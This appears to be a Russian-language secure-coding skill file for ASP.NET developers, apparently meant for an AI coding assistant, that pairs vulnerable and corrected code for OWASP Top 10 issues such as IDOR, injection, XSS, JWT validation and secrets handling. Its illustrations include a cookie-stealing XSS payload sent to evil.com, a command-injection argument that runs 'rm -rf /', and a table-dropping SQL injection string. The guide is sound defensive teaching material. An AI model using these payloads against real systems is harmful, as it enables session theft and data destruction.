---
name: owasp-security
description: OWASP Top 10 — ловушки безопасности. Активируется при security, auth bypass, injection, XSS, IDOR, CSRF, SQL injection, command injection, SSRF, JWT, token, authentication, authorization, CORS, CSP, sanitize
---

# OWASP Security — ловушки

## A01: Broken Access Control

### IDOR — доступ к чужим данным
Плохо: `GET /api/orders/123` → `_repo.GetByIdAsync(id)` без проверки владельца
Правильно: `if (order.UserId != currentUserId) return Forbid()` — фильтр по владельцу
Почему: подмена id в URL = доступ к чужим заказам, документам, данным. Самая частая уязвимость в API

### Эскалация привилегий через request body
Плохо: `user.Role = dto.Role` — роль приходит из тела запроса, клиент отправляет `Role = "Admin"`
Правильно: role assignment только через `[Authorize(Roles = "Admin")]` endpoint
Почему: mass assignment — клиент добавляет поле Role в JSON body. Без DTO = bind всех полей модели

### [Authorize] без проверки владельца
Плохо: `[Authorize] DeleteDocument(int docId)` — аутентификация ≠ авторизация
Правильно: проверка `doc.OwnerId == currentUserId` внутри action
Почему: любой аутентифицированный пользователь удаляет чужие документы. [Authorize] проверяет "кто ты", не "что тебе можно"

### Lookup дочернего ресурса только по своему ID
Плохо: `FindByNumber(itemNumber)` — родитель (`ownerId` / `tenantId`) передан в запрос, но не используется в `WHERE`
Правильно: `FirstOrDefaultAsync(x => x.OwnerId == ownerId && x.Number == itemNumber)` — bonded lookup по паре идентификаторов
Почему: при совпадении номеров в разных родителях вернётся чужой ресурс — баг корректности, не только security. Инвариант работает и до, и после включения auth; для pre-auth проектов это ещё и correctness invariant, защищающий от некорректных данных между клиентами

### Handler без контекста пользователя «потому что auth ещё нет»
Плохо: public handler принимает примитивы без `ICurrentUserContext` / `ITenantContext`, потому что аутентификация не включена
Правильно: context-интерфейс инжектится с первого дня (для pre-auth — реализация-заглушка `SystemUserContext` / `DefaultTenantContext`)
Почему: при включении auth заменяется одна регистрация в DI вместо сигнатур десятков handler'ов. Без context-интерфейса появляется архитектурный долг, который ретроактивно правится неделями и вносит регрессии

### Multi-tenancy поля в Entity задним числом
Плохо: Entity без `CompanyId` / `TenantId` / `OwnerId` в проекте, где multi-tenancy ожидается «в будущем»
Правильно: поле добавлено с самого начала, заполняется default значением (`SystemTenantId`) до включения tenant-логики
Почему: миграция данных живой системы под multi-tenancy — недели downtime + риск несогласованных данных. Поле, добавленное заранее с default, превращает миграцию в rollout логики, а не данных

## A02: Cryptographic Failures

### Секреты в коде
Плохо: `var connectionString = "Server=prod;Password=P@ssw0rd"` или `var apiKey = "sk-1234567890"`
Правильно: `configuration.GetConnectionString("Default")` из Vault / env vars / User Secrets
Почему: git history хранит всё вечно. Даже удалённый секрет доступен через `git log -p`

### MD5/SHA без соли для паролей
Плохо: `MD5.HashData(Encoding.UTF8.GetBytes(password))` — rainbow table за секунды
Правильно: `BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12)` или Argon2
Почему: MD5/SHA = fast hash, GPU перебирает миллиарды в секунду. bcrypt = slow hash, намеренно дорогой

## A03: Injection

### SQL Injection через конкатенацию
Плохо: `$"SELECT * FROM Users WHERE Name = '{name}'"` — `name = "'; DROP TABLE Users;--"`
Правильно: параметризованный запрос: `"WHERE Name = @name"` + `new { name }`
Почему: классика, но до сих пор встречается. Один необработанный input = полный доступ к БД

### FromSqlRaw с интерполяцией в EF Core
Плохо: `_context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'")` — interpolation ≠ параметризация
Правильно: `_context.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Name = {name}")`
Почему: FromSqlRaw принимает string — интерполяция подставляет значение в строку. FromSqlInterpolated создаёт параметр. Выглядят одинаково, работают по-разному

### Command Injection
Плохо: `Process.Start("ping", userInput)` — `userInput = "8.8.8.8 & rm -rf /"`
Правильно: whitelist validation: `IPAddress.TryParse(userInput, out var ip)` → используй parsed value
Почему: arbitrary OS command execution → RCE (Remote Code Execution). Один endpoint = полный контроль сервера

### XSS через Html.Raw
Плохо: `@Html.Raw(userComment)` — выводит HTML/JS без экранирования
Правильно: `@userComment` (Razor экранирует по умолчанию), `element.textContent = data` (JS, безопасно)
Почему: `<script>document.location='evil.com?c='+document.cookie</script>` — кража сессии. Html.Raw отключает защиту Razor

## A04: Insecure Design

### Mass Assignment
Плохо: `Update([FromBody] User user)` — bind всей Entity из request body
Правильно: DTO с нужными полями: `UpdateProfileDto(string Name, string Email)` — без Role, IsAdmin, PasswordHash
Почему: клиент добавляет `"isAdmin": true` в JSON → Entity обновляется с новой ролью

### Нет Rate Limiting на auth endpoints
Плохо: `/login`, `/register`, `/forgot-password` без ограничения количества запросов
Правильно: `AddRateLimiter` с жёсткими лимитами на auth endpoints (5-10 req/min)
Почему: brute force пароля, credential stuffing, SMS-бомбинг через forgot-password

## A07: Auth Failures

### JWT без валидации полей
Плохо: `handler.ReadJwtToken(jwt)` — парсит без проверки подписи, issuer, audience, lifetime
Правильно: `handler.ValidateToken(jwt, parameters)` с `ValidateIssuer=true, ValidateAudience=true, ValidateLifetime=true, ValidateIssuerSigningKey=true`
Почему: самодельный JWT с `"role": "admin"` проходит без проверки подписи. ReadJwtToken = десериализация, не валидация

### Account lockout не настроен
Плохо: неограниченные попытки входа — brute force по словарю
Правильно: `MaxFailedAccessAttempts = 5`, `DefaultLockoutTimeSpan = 15 min`
Почему: 10000 паролей/мин без lockout. С lockout — 5 попыток и 15 мин ожидания

## A09: Logging Failures

### Пароли/токены в логах
Плохо: `logger.Log("Login: {Email}, password: {Password}", email, password)`
Правильно: логируй auth события, ошибки авторизации, input validation fails — без sensitive data
Почему: логи попадают в Seq/ELK → доступны всей команде → пароли/токены скомпрометированы

## Чек-лист ревью

- Есть `[Authorize]` + проверка владельца ресурса
- Lookup дочернего ресурса — bonded по паре `(parentId, childId)`
- `ICurrentUserContext` / `ITenantContext` инжектится даже в pre-auth стадии
- Multi-tenancy поля в Entity с первого дня (не задним числом)
- DTO вместо прямого биндинга Entity
- Параметризованные запросы (нет конкатенации SQL)
- FromSqlInterpolated, не FromSqlRaw с интерполяцией
- Нет секретов в коде, конфигах, логах
- Rate limiting на auth endpoints
- JWT: ValidateToken, не ReadJwtToken
